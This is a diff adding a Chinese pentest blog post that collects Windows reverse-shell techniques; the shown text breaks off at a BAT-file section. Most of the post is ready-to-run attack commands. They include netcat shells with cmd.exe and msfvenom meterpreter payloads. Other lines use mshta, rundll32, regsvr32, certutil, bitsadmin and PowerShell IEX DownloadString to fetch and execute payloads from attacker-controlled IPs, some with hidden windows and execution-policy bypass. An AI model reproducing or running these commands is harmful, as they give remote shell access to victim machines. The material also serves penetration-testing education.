@@ -1,0 +1,333 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>0x09 - Web安全基础-Windows反弹shell | 晚上十一点睡觉のBlog</title><meta name="author" content="晚上十一点睡觉"><meta name="copyright" content="晚上十一点睡觉"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="windows反弹shell 各种windows反弹shell的命令NCNC正向Shell#被控端：nc -lvvp 6666 -e cmd.exe#控制端：nc 192.168.1.106 6666  原理： 被控端将cmd.exe重定向到本地的6666端口，控制端主动连接被控端的6666端口，即"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://gungnir.top/posts/61475"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?60a7a67c81784f02b889a11753e4e8cc";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: 晚上十一点睡觉","link":"链接: ","source":"来源: 晚上十一点睡觉のBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '0x09 - Web安全基础-Windows反弹shell',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-28 03:04:54'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">109</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">59</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237506.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">晚上十一点睡觉のBlog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">0x09 - Web安全基础-Windows反弹shell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-14T12:45:30.000Z" title="发表于 2022-11-14 20:45:30">2022-11-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-27T19:04:54.244Z" title="更新于 2022-11-28 03:04:54">2022-11-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="0x09 - Web安全基础-Windows反弹shell"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/61475#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>windows反弹shell</p>
+<h1 id="各种windows反弹shell的命令"><a href="#各种windows反弹shell的命令" class="headerlink" title="各种windows反弹shell的命令"></a>各种windows反弹shell的命令</h1><h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><h3 id="NC正向Shell"><a href="#NC正向Shell" class="headerlink" title="NC正向Shell"></a>NC正向Shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端：</span></span><br><span class="line">nc -lvvp 6666 -e cmd.exe</span><br><span class="line"><span class="comment">#控制端：</span></span><br><span class="line">nc 192.168.1.106 6666</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<p>被控端将<code>cmd.exe</code>重定向到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell</p>
+<h3 id="NC反向Shell"><a href="#NC反向Shell" class="headerlink" title="NC反向Shell"></a>NC反向Shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端：</span></span><br><span class="line">nc -lvvp 7777</span><br><span class="line"><span class="comment">#被控端：</span></span><br><span class="line">nc -e cmd.exe 192.168.1.105 7777</span><br></pre></td></tr></table></figure>
+
+<p>原理：<br>被控端将<code>cmd.exe</code>重定向到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</p>
+<h2 id="Mshta"><a href="#Mshta" class="headerlink" title="Mshta"></a>Mshta</h2><p><code>Mshta.exe</code>是用于负责解释运行<code>HTA</code>(HTML应用程序)文件的Windows OS实用程序。 可以运行<code>JavaScript</code>或<code>VBScript</code>的HTML文件。</p>
+<h3 id="通过Metasploit的HTA-Web-Server模块发起HTA攻击"><a href="#通过Metasploit的HTA-Web-Server模块发起HTA攻击" class="headerlink" title="通过Metasploit的HTA Web Server模块发起HTA攻击"></a>通过<code>Metasploit</code>的<code>HTA Web Server</code>模块发起HTA攻击</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> srvhost 192.168.78.117</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; <span class="built_in">set</span> target 1</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; exploit –j</span><br></pre></td></tr></table></figure>
+
+<p>目标机执行：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mshta http://<span class="number">192.168</span>.<span class="number">78.117</span>:<span class="number">8080</span>/<span class="number">9</span>A5Iiz.hta</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过Msfvenom生成恶意HTA文件发起攻击"><a href="#通过Msfvenom生成恶意HTA文件发起攻击" class="headerlink" title="通过Msfvenom生成恶意HTA文件发起攻击"></a>通过<code>Msfvenom</code>生成恶意<code>HTA</code>文件发起攻击</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成hta文件</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.78.117 lport=4444 -f hta-psh -o 1.hta</span><br><span class="line"><span class="comment">#开启http服务</span></span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line">python3 -m http.server</span><br><span class="line"><span class="comment">#设置监听</span></span><br><span class="line">msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.78.117 -P 4444</span><br><span class="line"><span class="comment">#目标机器发起请求</span></span><br><span class="line">mshta.exe http://192.168.78.117:8000/1.hta</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150210875.png" alt="image-20221115020725743"></p>
+<h3 id="通过Cobaltstrike生成恶意HTA文件发起攻击"><a href="#通过Cobaltstrike生成恶意HTA文件发起攻击" class="headerlink" title="通过Cobaltstrike生成恶意HTA文件发起攻击"></a>通过<code>Cobaltstrike</code>生成恶意<code>HTA</code>文件发起攻击</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150210876.png" alt="image-20221115020758901" style="zoom:50%;" />
+
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150210877.png" alt="image-20221115020825604" style="zoom:50%;" />
+
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150210878.png" alt="image-20221115020909001" style="zoom:50%;" />
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mshta http://<span class="number">139.155</span>.<span class="number">49.43</span>:<span class="number">8088</span>/download/file.ext</span><br></pre></td></tr></table></figure>
+
+<h2 id="Rundll32"><a href="#Rundll32" class="headerlink" title="Rundll32"></a>Rundll32</h2><p><code>Rundll32.exe</code>与Windows操作系统相关，它允许调用从<code>DLL</code>导出的函数(16位或32位)，并将其存储在适当的内存库中。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/rundll32">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/rundll32</a></p>
+</blockquote>
+<h3 id="通过Msfvenom生成反弹shell的dll发起Rundll32攻击"><a href="#通过Msfvenom生成反弹shell的dll发起Rundll32攻击" class="headerlink" title="通过Msfvenom生成反弹shell的dll发起Rundll32攻击"></a>通过Msfvenom生成反弹shell的dll发起Rundll32攻击</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=139.155.49.43 LPORT=5533 -f dll &gt; mingy.dll</span><br><span class="line">handler -p windows/x64/meterpreter/reverse_tcp -H 139.155.49.43 -P 5533</span><br></pre></td></tr></table></figure>
+
+<h4 id="本地加载"><a href="#本地加载" class="headerlink" title="本地加载"></a>本地加载</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">powershell.exe -c &quot;(New-Object System.NET.WebClient).DownloadFile(&#x27;http://139.155.49.43:8000/</span><br><span class="line">mingy.dll&#x27;,\&quot;c:\mingy.dll\&quot;)</span><br><span class="line">rundll32 shell32.dll,Control_RunDLL C:\mingy.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352380.png" alt="image-20221115133150879"></p>
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352381.png" alt="image-20221115133204224"></p>
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352382.png" alt="image-20221115133218151"></p>
+<h4 id="利用smb服务远程加载"><a href="#利用smb服务远程加载" class="headerlink" title="利用smb服务远程加载"></a>利用smb服务远程加载</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.105 lport=5555 -f dll -o mingy.dll</span><br><span class="line"></span><br><span class="line">impacket-smbserver dll /root/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352383.png" alt="image-20221115133319085"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">rundll32.exe shell32.dll,Control_RunDLL \\<span class="number">192.168</span>.<span class="number">1.105</span>\dll\mingy.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352384.png" alt="image-20221115133341265"></p>
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352385.png" alt="image-20221115133354716"></p>
+<h3 id="通过Metasploit的SMB-Delivery模块发起Rundll32攻击"><a href="#通过Metasploit的SMB-Delivery模块发起Rundll32攻击" class="headerlink" title="通过Metasploit的SMB Delivery模块发起Rundll32攻击"></a>通过Metasploit的SMB Delivery模块发起Rundll32攻击</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/smb_delivery</span><br><span class="line">msf exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> srvhost 192.168.78.117</span><br><span class="line">msf exploit(windows/smb/smb_delivery) &gt; exploit –j</span><br><span class="line"></span><br><span class="line">rundll32.exe \\192.168.78.117\GylDS\test.dll,0</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用Rundll32加载hta反弹shell"><a href="#利用Rundll32加载hta反弹shell" class="headerlink" title="利用Rundll32加载hta反弹shell"></a>利用Rundll32加载hta反弹shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=7777 -f hta-psh &gt; 44.hta</span><br><span class="line"></span><br><span class="line">bitsadmin /transfer shell http://139.155.49.43 /44.hta C:\windows\temp\44.hta</span><br><span class="line"></span><br><span class="line">rundll32.exe url.dll,OpenURL 44.hta</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352386.png" alt="image-20221115133533811"></p>
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352387.png" alt="image-20221115133551772"></p>
+<h2 id="Regsvr32"><a href="#Regsvr32" class="headerlink" title="Regsvr32"></a>Regsvr32</h2><p><code>Regsvr32.exe</code>是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。<code>Regsvr32.exe</code>安装在Windows XP和Windows后续版本的 <code>%systemroot%\System32</code>  文件夹中。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/regsvr32">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/regsvr32</a></p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">语法:Regsvr32 [/s] [/u] [/n][/i[:cmdline]] &lt;dllname&gt;</span><br><span class="line">/u - 注销服务器</span><br><span class="line">/i - 调用DllInstall传递一个可选的[cmdline];当它与/u一起使用时，它调用dll来卸载</span><br><span class="line">/n - 不要调用DllRegisterServer; 此选项必须与/i一起使用</span><br><span class="line">/s - 沉默; 不显示消息框</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过Metasploit的Web-Delivery模块启动Regsvr32"><a href="#通过Metasploit的Web-Delivery模块启动Regsvr32" class="headerlink" title="通过Metasploit的Web Delivery模块启动Regsvr32"></a>通过Metasploit的Web Delivery模块启动Regsvr32</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit (web_delivery)&gt; <span class="built_in">set</span> srvhost 192.168.78.117</span><br><span class="line">msf exploit (web_delivery)&gt; <span class="built_in">set</span> target 3</span><br><span class="line">msf exploit (web_delivery)&gt; <span class="built_in">set</span> payload </span><br><span class="line">windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit (web_delivery)&gt; <span class="built_in">set</span> lhost 192.168.78.117 </span><br><span class="line">msf exploit (web_delivery)&gt; exploit –j</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.78.117:8080/NE67gb2mbfQt.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352388.png" alt="image-20221115133738639"></p>
+<h2 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h2><p>Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们可以使用此工具在目标计算机中执行恶意的exe文件以获得meterpreter会话。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil</a></p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=6666 -f exe &gt; 44.exe</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -<span class="built_in">split</span> -f http://139.155.49.43/44.exe c:\windows\temp\44.exe &amp; start c:\windows\temp\44.exe</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -<span class="built_in">split</span> -f http://139.155.49.43/44.exe delete</span><br></pre></td></tr></table></figure>
+
+<p>缓存文件位置：<code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
+<h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://docs.microsoft.com/zh-cn/powershell/">https://docs.microsoft.com/zh-cn/powershell/</a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.freebuf.com/articles/web/220046.html">https://www.freebuf.com/articles/web/220046.html</a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/powershell">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/powershell</a></p>
+</blockquote>
+<h3 id="常用参数解释"><a href="#常用参数解释" class="headerlink" title="常用参数解释"></a>常用参数解释</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。</span><br><span class="line">WindowStyle Hidden（-w Hidden）：隐藏窗口</span><br><span class="line">Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。</span><br><span class="line">NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。</span><br><span class="line">Noexit（-Noe）：执行后不退出Shell。</span><br><span class="line">EncodedCommand（-enc）: 接受base64 encode的字符串编码，避免一些解析问题</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=8899 -f psh-reflection -o shell.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352389.png" alt="image-20221115134120120"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-windowstyle</span> <span class="keyword">hidden</span> <span class="literal">-exec</span> bypass <span class="literal">-c</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://139.155.49.43/shell.ps1’);shell.ps1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352390.png" alt="image-20221115134131585"></p>
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352391.png" alt="image-20221115134145072"></p>
+<h3 id="通过PowerShell发动Powercat攻击"><a href="#通过PowerShell发动Powercat攻击" class="headerlink" title="通过PowerShell发动Powercat攻击"></a>通过PowerShell发动Powercat攻击</h3><p><code>Powercat</code>是PowerShell本地后门侦听器和反向shell工具，也称为修改版本的<code>netcat</code>，因为它集成支持经过编码的有效载荷。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/besimorhino/powercat.git</span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line">powershell -c <span class="string">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://47.101.214.85:8000/powercat.ps1&#x27;);powercat -c 47.101.214.85 -p 12345 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352392.png" alt="image-20221115134251465"></p>
+<h3 id="通过Web-delivery反弹shell"><a href="#通过Web-delivery反弹shell" class="headerlink" title="通过Web delivery反弹shell"></a>通过Web delivery反弹shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; <span class="built_in">set</span> target 2</span><br><span class="line">msf exploit(web_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; exploit -j</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352393.png" alt="image-20221115134318824"></p>
+<h3 id="通过PowerShell启动cscript-exe"><a href="#通过PowerShell启动cscript-exe" class="headerlink" title="通过PowerShell启动cscript.exe"></a>通过PowerShell启动cscript.exe</h3><p><code>PowerShell</code>允许客户端通过执行<code>cscript.exe</code>来运行<code>wsf</code>、<code>js</code>和<code>vbscript</code>脚本。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=139.155.49.43 LPORT=7777 -f vbs -o 3.vbs</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line">python3 -m http.server</span><br><span class="line"></span><br><span class="line">msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 139.155.49.43 -P 7777</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell.exe -c <span class="string">&quot;(New-Object System.NET.WebClient).DownloadFile(&#x27;http://139.155.49.43 :8000/3.vbs&#x27;,\&quot;<span class="variable">$env</span>:temp\test.vbs\&quot;);Start-Process %windir%\system32\cscript.exe \&quot;<span class="variable">$env</span>:temp\test.vbs\&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352394.png" alt="image-20221115134429698"></p>
+<h3 id="通过PowerShell启动BAT文件攻击"><a href="#通过PowerShell启动BAT文件攻击" class="headerlink" title="通过PowerShell启动BAT文件攻击"></a>通过PowerShell启动BAT文件攻击</h3><p>PowerShell允许客户端执行bat文件。</p>
